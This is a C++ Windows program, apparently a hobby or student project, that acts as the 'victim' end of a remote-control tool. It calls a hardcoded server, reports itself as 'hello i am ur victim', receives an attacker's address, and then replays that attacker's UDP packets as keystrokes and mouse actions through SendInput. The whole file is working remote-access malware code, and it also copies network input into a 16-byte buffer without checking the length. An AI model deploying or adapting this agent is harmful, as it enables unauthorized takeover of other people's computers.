using namespace std;
#include <windows.h>
#include <iostream>
#include "wtypes.h"
#include <string>

#pragma comment(lib,"ws2_32.lib")
#pragma warning(disable : 4996)

#define SERVER "192.168.1.211"
#define BUFLEN 1024
#define PORT 8200
#define scroll_down 9
#define scroll_up 25
#define left_down 3
#define left_up 19
#define right_down 5
#define right_up 21
#define middle_down 7
#define middle_up 23

INPUT keyboard_input;
INPUT mouse_input;

struct sockaddr_in server_ip;
struct sockaddr_in current_attacker_ip;
struct sockaddr_in last_recieve_ip;

int s, slen = sizeof(server_ip);
char buf[BUFLEN];
char message[BUFLEN] = "victim";
WSADATA wsa;
int codes[] = { 1, 2, 4, 32 };
string names[] = { "left_mouse", "right_mouse", "middle_mouse", " " };
int horizontal = 0;
int vertical = 0;

void GetDesktopResolution()
{
    RECT desktop;
    const HWND hDesktop = GetDesktopWindow();
    GetWindowRect(hDesktop, &desktop);
    horizontal = desktop.right;
    vertical = desktop.bottom;
};

void move_cursor(int x_percent, int y_percent) {
    SetCursorPos(x_percent * horizontal / 100, y_percent  * vertical / 100);
};

void press_key(int code) { //https://help.mjtnet.com/article/262-virtual-key-codes for codes
    keyboard_input.ki.wVk = code;
    keyboard_input.ki.dwFlags = 0;
    SendInput(1, &keyboard_input, sizeof(INPUT));


};

void release_key(int code) {
    keyboard_input.ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(1, &keyboard_input, sizeof(INPUT));
};

void handle_input(int x) {
    if (x % 2 == 0) {
        x /= 2;
        if (x % 2 == 0) {
            press_key(x / 2);
        }
        else {
            release_key(x / 2);
        }
    }
    else {
        bool is_not_move = true;
        switch (x) {
        case (scroll_down):
            mouse_input.mi.dwFlags = MOUSEEVENTF_WHEEL;
            mouse_input.mi.mouseData = -120;
            break;
        case (scroll_up):
            mouse_input.mi.dwFlags = MOUSEEVENTF_WHEEL;
            mouse_input.mi.mouseData = 120;
            break;
        case (left_down):
            mouse_input.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
            break;
        case (left_up):
            mouse_input.mi.dwFlags = MOUSEEVENTF_LEFTUP;
            break;
        case (right_down):
            mouse_input.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;
            break;
        case (right_up):
            mouse_input.mi.dwFlags = MOUSEEVENTF_RIGHTUP;
            break;
        case (middle_down):
            mouse_input.mi.dwFlags = MOUSEEVENTF_MIDDLEDOWN;
            break;
        case (middle_up):
            mouse_input.mi.dwFlags = MOUSEEVENTF_MIDDLEUP;
            break;
        default:
            is_not_move = false;
            x /= 16;
            int guide_number = 128;
            int x_percentage = x % guide_number;
            int y_percentage = x / (guide_number + 1);
            move_cursor(x_percentage, y_percentage);
            break;
        }
        if (is_not_move) {
            SendInput(1, &mouse_input, sizeof(INPUT));
            mouse_input.mi.mouseData = 0;
        }
    }
    Sleep(1);

};
bool is_same_ip(sockaddr_in ip1, sockaddr_in ip2) {
    return (ip1.sin_port == ip2.sin_port && ip1.sin_addr.S_un.S_addr == ip2.sin_addr.S_un.S_addr);
}

void handle_packet(char buf[]){ 
    if (is_same_ip(last_recieve_ip, server_ip)) { // https://www.digitalocean.com/community/tutorials/convert-string-to-char-array-c-plus-plus
        string x = buf;
        int index_of_space = x.find(" ");
        string ip = x.substr(0, index_of_space);
        string port = x.substr(index_of_space + 1, x.length() - (index_of_space + 1));
        char char_of_ip[16];
        strcpy(char_of_ip, ip.c_str());
        char_of_ip[ip.length()] = '\0';
        current_attacker_ip.sin_addr.S_un.S_addr = inet_addr(char_of_ip);
        current_attacker_ip.sin_port = htons(stoi(port));

        strcpy(message, string("hello i am ur victim").c_str());
        if (sendto(s, message, strlen(message), 0, (struct sockaddr*)&current_attacker_ip, slen) == SOCKET_ERROR) {
            cout << "fail3" << endl;
        }
    }
    
    else if (is_same_ip(last_recieve_ip, current_attacker_ip)) {
        int a = int((unsigned char)(buf[3]) << 24 |
            (unsigned char)(buf[2]) << 16 |
            (unsigned char)(buf[1]) << 8 |
            (unsigned char)(buf[0]));
        handle_input(a);
    }
    
}

int main()
{
    //--------------------- some basic setup ----------------------------
    GetDesktopResolution();
    //------------------------ socket setup -----------------------------

    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        cout << "error smthg" << endl;
        return - 1;

    }
    if ((s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == SOCKET_ERROR) {
        cout << "error 2" << endl;
        return -1;
    }
    memset((char*)&server_ip, 0, sizeof(server_ip));
    server_ip.sin_family = AF_INET;
    current_attacker_ip.sin_family = AF_INET;
    last_recieve_ip.sin_family = AF_INET;
    server_ip.sin_port = htons(PORT);
    server_ip.sin_addr.S_un.S_addr = inet_addr(SERVER);
    if (sendto(s, message, strlen(message), 0, (struct sockaddr*)&server_ip, slen) == SOCKET_ERROR) {
        cout << "fail3" << endl;
        return -1;
    }
    // ------------------------------------------------------------------
    //--------------------- keyboard input setup ------------------------
    keyboard_input.type = INPUT_KEYBOARD;
    keyboard_input.ki.wScan = 0;
    keyboard_input.ki.time = 0;
    keyboard_input.ki.dwExtraInfo = 0;
    //-------------------------------------------------------------------
    //---------------------- mouse input setup --------------------------
    mouse_input.type = INPUT_MOUSE;
    mouse_input.mi.mouseData = 0;
    mouse_input.mi.time = 0;
    //-------------------------------------------------------------------

    while (true){
        memset(buf, '\0', BUFLEN);
        if (recvfrom(s, buf, BUFLEN, 0, (struct sockaddr*)&last_recieve_ip, &slen) == SOCKET_ERROR) {
            cout << "error reciving" << endl;
            return -1;
        }
        handle_packet(buf);
    }

    // ---------------------- end of code stuff -------------------------
    closesocket(s);
    WSACleanup();
    return 0;
}